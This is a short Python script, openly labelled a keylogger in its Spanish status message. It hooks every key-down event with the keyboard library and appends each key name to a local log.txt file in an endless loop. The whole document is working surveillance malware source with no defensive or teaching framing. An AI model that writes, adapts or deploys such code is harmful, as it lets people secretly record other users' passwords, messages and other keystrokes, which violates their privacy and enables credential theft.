import keyboard, time, datetime; log_file = "log.txt"

open(log_file, 'w').close() 

keyboard.hook(lambda event: open(log_file, 'a').write(event.name + '\n') if event.event_type == keyboard.KEY_DOWN else None)

print(f"Keylogger simple iniciado. Registrando en: {log_file}")
while True:
    time.sleep(10)
